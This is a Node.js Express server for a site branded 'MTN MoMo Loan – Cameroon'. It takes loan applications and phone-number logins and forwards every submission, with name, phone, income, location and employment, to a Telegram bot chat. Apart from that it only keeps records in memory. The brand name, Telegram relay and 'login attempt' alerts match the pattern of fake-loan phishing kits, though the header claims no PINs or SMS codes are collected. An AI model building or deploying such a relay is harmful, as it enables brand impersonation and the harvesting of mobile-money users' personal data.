// backend/server.js
// MTN MoMo Loan – Cameroon
// Express backend: receives loan applications, sends Telegram notifications.
//
// SECURITY RULES FOLLOWED HERE:
//  - No PIN is ever accepted, logged, or stored.
//  - No SMS content is ever accepted, logged, or stored.
//  - All secrets come from environment variables (never hardcoded).

require('dotenv').config();

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// TELEGRAM CONFIG (from environment only)
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Notifications disabled.');
}

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors({
    origin: process.env.ALLOWED_ORIGIN || '*',
    methods: ['GET', 'POST'],
}));
app.use(express.json({ limit: '50kb' }));

// Rate limit all API routes
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 60,                   // 60 requests per IP per window
    standardHeaders: true,
    legacyHeaders: false,
    message: { ok: false, error: 'Too many requests. Please try again later.' },
});
app.use('/api/', apiLimiter);

// ============================================
// HELPERS
// ============================================
function generateReference() {
    const raw = crypto.randomBytes(4).toString('hex').toUpperCase().slice(0, 6);
    return `MM-${raw}`;
}

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function isValidCameroonPhone(phone) {
    return /^\+237\d{9}$/.test(phone);
}

async function sendTelegramMessage(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, reason: 'not_configured' };
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
            }),
        });
        const data = await res.json();
        return { ok: res.ok, data };
    } catch (err) {
        console.error('Telegram send failed:', err.message);
        return { ok: false, reason: 'network_error' };
    }
}

// In-memory store (replace with a DB in production)
const applications = new Map();
const sessions = new Map();

// ============================================
// ROUTES
// ============================================

// Health check
app.get('/', (req, res) => {
    res.json({ ok: true, service: 'momo-loan-backend', time: new Date().toISOString() });
});

// --------------------------------------------
// POST /api/application
// --------------------------------------------
app.post('/api/application', async (req, res) => {
    try {
        const b = req.body || {};

        const required = ['fullName', 'phone', 'amount', 'term'];
        for (const k of required) {
            if (!b[k]) {
                return res.status(400).json({ ok: false, error: `Missing field: ${k}` });
            }
        }

        if (!isValidCameroonPhone(b.phone)) {
            return res.status(400).json({ ok: false, error: 'Invalid Cameroon phone number (expected +237XXXXXXXXX)' });
        }

        const amount = Number(b.amount);
        const term = Number(b.term);
        if (!Number.isFinite(amount) || amount < 50000 || amount > 1000000) {
            return res.status(400).json({ ok: false, error: 'Amount must be between 50,000 and 1,000,000 XAF' });
        }
        if (!Number.isFinite(term) || term < 1 || term > 24) {
            return res.status(400).json({ ok: false, error: 'Term must be between 1 and 24 months' });
        }

        const reference = generateReference();

        const application = {
            reference,
            fullName: String(b.fullName).slice(0, 100),
            phone: b.phone,
            amount,
            term,
            purpose: b.purpose ? String(b.purpose).slice(0, 300) : '',
            region: b.region ? String(b.region).slice(0, 60) : '',
            city: b.city ? String(b.city).slice(0, 60) : '',
            employment: b.employment ? String(b.employment).slice(0, 60) : '',
            income: b.income ? Number(b.income) : null,
            submittedAt: new Date().toISOString(),
            status: 'pending',
        };

        applications.set(reference, application);

        const msg =
            `🆕 <b>New Loan Application</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔖 <b>Reference:</b> ${escapeHtml(reference)}\n` +
            `👤 <b>Name:</b> ${escapeHtml(application.fullName)}\n` +
            `📱 <b>Phone:</b> ${escapeHtml(application.phone)}\n` +
            `💰 <b>Amount:</b> ${application.amount.toLocaleString('en-US')} XAF\n` +
            `📅 <b>Term:</b> ${application.term} months\n` +
            (application.purpose ? `📝 <b>Purpose:</b> ${escapeHtml(application.purpose)}\n` : '') +
            (application.region ? `📍 <b>Region:</b> ${escapeHtml(application.region)}\n` : '') +
            (application.city ? `🏙 <b>City:</b> ${escapeHtml(application.city)}\n` : '') +
            (application.employment ? `💼 <b>Employment:</b> ${escapeHtml(application.employment)}\n` : '') +
            (application.income ? `💵 <b>Monthly income:</b> ${application.income.toLocaleString('en-US')} XAF\n` : '') +
            `🕐 <b>Submitted:</b> ${escapeHtml(application.submittedAt)}`;

        await sendTelegramMessage(msg);

        return res.json({ ok: true, reference });
    } catch (err) {
        console.error('application error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// POST /api/login
// --------------------------------------------
app.post('/api/login', async (req, res) => {
    try {
        const phone = (req.body && req.body.phone) || '';
        if (!isValidCameroonPhone(phone)) {
            return res.status(400).json({ ok: false, error: 'Invalid phone number' });
        }

        const token = crypto.randomBytes(24).toString('hex');
        const session = {
            token,
            phone,
            createdAt: new Date().toISOString(),
        };
        sessions.set(token, session);

        const msg =
            `🔐 <b>Login attempt</b>\n` +
            `📱 Phone: ${escapeHtml(phone)}\n` +
            `🕐 ${escapeHtml(session.createdAt)}`;

        await sendTelegramMessage(msg);

        return res.json({ ok: true, token });
    } catch (err) {
        console.error('login error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// GET /api/status/:ref
// --------------------------------------------
app.get('/api/status/:ref', (req, res) => {
    const app_ = applications.get(req.params.ref);
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    return res.json({
        ok: true,
        reference: app_.reference,
        status: app_.status,
        submittedAt: app_.submittedAt,
    });
});

// --------------------------------------------
// 404 + error handlers
// --------------------------------------------
app.use((req, res) => {
    res.status(404).json({ ok: false, error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ ok: false, error: 'Server error' });
});

// ============================================
// START
// ============================================
app.listen(PORT, () => {
    console.log(`✅ Momo Loan backend running on port ${PORT}`);
    console.log(`   Telegram notifications: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
});
